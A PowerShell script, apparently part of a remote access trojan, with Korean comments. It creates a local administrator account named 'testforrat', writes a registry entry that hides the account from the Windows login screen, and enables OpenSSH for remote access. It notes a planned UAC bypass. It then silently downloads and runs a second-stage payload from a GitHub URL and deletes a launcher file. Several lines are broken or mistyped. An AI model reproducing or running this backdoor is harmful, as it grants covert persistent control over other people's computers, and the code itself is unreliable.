

function rand_txt {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}


function Create-NewLocalAdmin {
    param(
        [string]$Username,
        [string]$Password
    )

    # 로컬 관리자 그룹에 새로운 계정 추가
    net localgroup Administrators $Username /add

    # 새로운 계정의 비밀번호 설정
    $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    Set-LocalUser -Name $Username -Password $securePassword
}

#create admin user 
Create-NewLocalAdmin -Username "testforrat" -Password "testforrat"

#make directory
$directory_name = rand_txt
#$path = $env:temp/$directory_name
$path = "C:\Users\%username%\"+$directory_name
#$initial_location = Get-Lodation

mkdir $path
cd $path


#regedit 

#SpecialAccounts\UserList 
#Users located under this path won't be displayed on the login screen.

$registry = rand_txt
(
    echo Windows Registry Editor Version 5.00
    echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
    echo "testforrat"=dword:00000000 ; 
) > "$registry.reg"


Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Setvice -Name sshd
-StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*



@REM TODO: add UAC bypass



powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g2.ps1 -OutFile KFPGaEYdcz.ps1
powershell.exe -windowstyle hidden -ep unrestricted ./KFPGaEYdcz.ps1
del wEaoFkNduy.cmd